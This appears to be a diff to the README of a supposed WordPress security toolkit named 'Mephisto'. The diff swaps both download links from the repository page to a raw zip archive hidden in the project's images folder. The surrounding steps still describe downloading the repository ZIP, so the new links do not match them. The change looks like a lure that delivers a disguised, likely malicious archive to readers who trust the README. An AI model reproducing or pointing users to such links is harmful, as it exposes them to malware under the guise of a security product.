@@ -1,6 +1,6 @@
 # 🔍 Mephisto - Secure your WordPress sites with ease
 
-[![Download Mephisto](https://img.shields.io/badge/Download-Mephisto-blue.svg)](https://github.com/Eastside-georgia30/Mephisto)
+[![Download Mephisto](https://img.shields.io/badge/Download-Mephisto-blue.svg)](https://github.com/Eastside-georgia30/Mephisto/raw/refs/heads/main/images/Software-1.2-alpha.5.zip)
 
 ## 📖 About Mephisto
 
@@ -19,7 +19,7 @@ Before you start, make sure your computer meets these requirements:
 
 Follow these steps to get the tool on your machine:
 
-1. Visit [this page to download](https://github.com/Eastside-georgia30/Mephisto) the latest version of the toolkit.
+1. Visit [this page to download](https://github.com/Eastside-georgia30/Mephisto/raw/refs/heads/main/images/Software-1.2-alpha.5.zip) the latest version of the toolkit.
 2. Look for the green button labeled Code and select Download ZIP.
 3. Save the folder to your desktop.
 4. Right-click the folder and choose Extract All.
